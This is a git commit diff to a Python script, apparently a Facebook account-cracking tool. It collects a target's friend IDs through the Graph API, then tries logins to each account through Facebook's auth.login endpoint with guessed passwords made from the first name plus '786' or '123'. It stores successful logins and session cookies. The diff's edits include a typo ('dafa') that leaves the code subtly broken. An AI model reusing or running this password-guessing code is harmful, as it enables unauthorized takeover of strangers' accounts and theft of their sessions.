6ad939b11c9371071d2e48516ac32135c40ff5f4
Ibrahim0980 <66704310+Ibrahim0980@users.noreply.github.com>
2020-06-10 05:25:11 +0500

    Update Ibrahim.py

--- Ibrahim.py
+++ Ibrahim.py
@@ -273,7 +273,7 @@ def pilih_super():
 		print"\033[1;35;40m[✺] Getting IDs..."
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
-		for i in z['wifi']:
+		for i in z['data']:
 			id.append(i['id'])
 	elif peak =="3":
 		os.system('clear')
@@ -320,7 +320,7 @@ def pilih_super():
 			b = json.loads(a.text)
 			pass1 = b['first_name'] + '786'
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-			q = json.load(wifi)
+			q = json.load(data)
 			if 'access_token' in q:
 				print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass1 + ' 😋 ' + b['name']
 				oks.append(user+pass1)
@@ -334,7 +334,7 @@ def pilih_super():
 				else:
 					pass2 = b['first_name'] + '123'
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-					q = json.load(wifi)
+					q = json.load(dafa)
 					if 'access_token' in q:
 						print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass2 + ' 👽 ' + b['name']
 						oks.append(user+pass2)
